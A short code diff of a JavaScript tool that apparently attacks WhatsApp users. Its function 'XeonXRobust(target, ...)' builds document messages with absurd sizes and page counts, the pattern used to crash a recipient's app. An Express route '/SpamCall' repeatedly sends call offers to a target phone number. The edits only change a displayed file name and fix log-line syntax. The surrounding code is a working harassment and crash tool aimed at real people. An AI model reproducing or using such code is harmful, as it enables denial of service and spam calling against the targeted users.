@@ -76,7 +76,7 @@ async function XeonXRobust(target, o, Ptcp = true) {
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-          fileName: "🕷️🕸️ 𝑺𝑷𝑰𝑫𝑬𝑹-𝑿 👻",
+          fileName: "👻",
           fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
           directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1726867151",
@@ -110,7 +110,7 @@ async function XeonXRobust(target, o, Ptcp = true) {
            fileLength: "9999999999999",
            pageCount: 1316134911,
            mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-           fileName: "🕷️🕸️ 𝑺𝑷𝑰𝑫𝑬𝑹-𝑿 👻",
+           fileName: "👻",
            fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
            directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1724474503",
@@ -158,9 +158,9 @@ app.get('/SpamCall', async (req, res) => {
 	async function sendOfferCall(target) {
     try {
         await sam.offerCall(target);
-        console.log(chalk.white.bold(Success Send Offer Call To Target));
+        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
     } catch (error) {
-        console.error(chalk.white.bold(Failed Send Offer Call To Target:, error));
+        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
     }
 	}
 const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
